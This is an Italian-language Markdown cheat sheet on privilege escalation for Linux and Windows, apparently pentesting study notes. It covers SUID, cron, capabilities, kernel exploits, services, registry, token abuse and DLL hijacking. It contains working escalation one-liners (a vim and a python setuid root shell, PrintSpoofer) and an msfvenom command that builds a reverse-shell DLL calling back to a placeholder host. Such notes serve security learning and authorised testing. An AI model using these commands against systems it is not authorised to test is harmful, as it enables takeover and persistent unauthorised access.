# 📈 Privilege Escalation

Appunti e snippet per la fase di **escalation dei privilegi**.

## 📌 Obiettivi

* Individuare meccanismi di esecuzione privilegiata mal configurati
* Escalare da utente limitato a root/Administrator
* Preparare l’accesso persistente

---

## 🧾 Linux

### 🔹 SUID Binaries

**Perché usarli:**
I file con **SUID bit** permettono di eseguire binari con i privilegi del proprietario (spesso root). Se mal configurati → escalation.

**Opzioni principali / tecniche:**

* Ricerca file con SUID
* Verifica binari noti su **GTFOBins**

```bash
# Trova tutti i binari con SUID
find / -perm -4000 2>/dev/null

# Cerca con filtro
find / -user root -perm -4000 -exec ls -ldb {} \;

# Esempio GTFOBins con vim
vim -c ':!/bin/sh'
```

---

### 🔹 Cronjob Misconfig

**Perché usarli:**
Se un cronjob esegue script con permessi elevati ma modificabili → privilege escalation.

```bash
# Controllo cronjob utente
crontab -l

# Controllo cronjob globali
ls -la /etc/cron*
cat /etc/crontab
```

*Tipico exploit:* sostituire script richiamato da root con una reverse shell.

---

### 🔹 Linux Capabilities

**Perché usarle:**
Le capabilities permettono di concedere privilegi specifici a binari. Se configurate male → escalation (es. `cap_setuid`).

```bash
# Lista binari con capabilities
getcap -r / 2>/dev/null

# Esempio exploit python con cap_setuid
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

---

### 🔹 Kernel Exploits

**Perché usarli:**
Se il kernel è vulnerabile → exploit locale (es. DirtyCow, DirtyPipe).

```bash
# Info kernel
uname -a
cat /etc/issue

# Ricerca exploit con searchsploit
searchsploit linux kernel 5.8
```

⚠️ *Ultima spiaggia: usali solo quando non ci sono altre vie, perché instabili.*

---

## 🧾 Windows

### 🔹 Servizi (Services)

**Perché usarli:**
Se un servizio gira come SYSTEM ma è modificabile (binary path, permessi cartella) → escalation.

```powershell
# Lista servizi e permessi
sc query
sc qc <servizio>
accesschk.exe -uwcqv "Authenticated Users" *
```

---

### 🔹 Registry

**Perché usarlo:**
Chiavi di registro mal configurate possono consentire escalation (es. AlwaysInstallElevated).

```powershell
# Check AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

---

### 🔹 Token Abuse

**Perché usarlo:**
Windows assegna **privilegi speciali** ai token utente (SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege).

Strumenti: **incognito**, **PrintSpoofer**, **RogueWinRM**.

```powershell
# Verifica privilegi
whoami /priv

# Esempio PrintSpoofer
PrintSpoofer.exe -i -c cmd
```

---

### 🔹 DLL Hijacking

**Perché usarlo:**
Se un programma eseguito da SYSTEM carica DLL da percorsi scrivibili → iniettare DLL malevola.

```powershell
# Monitoraggio caricamento DLL
procmon.exe (Sysinternals)

# Genera DLL malevola con msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f dll -o exploit.dll
```

---

## 📚 Risorse Utili

* 🔗 [GTFOBins (Linux)](https://gtfobins.github.io/)
* 🔗 [LOLBAS (Windows)](https://lolbas-project.github.io/)
* 🔗 [PayloadsAllTheThings – PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation)
* 🔗 [HackTricks – PrivEsc](https://book.hacktricks.xyz/)
* 🔗 [PrivEsc Cheatsheets (0xdf)](https://0xdf.gitlab.io/tags.html#privesc)

---
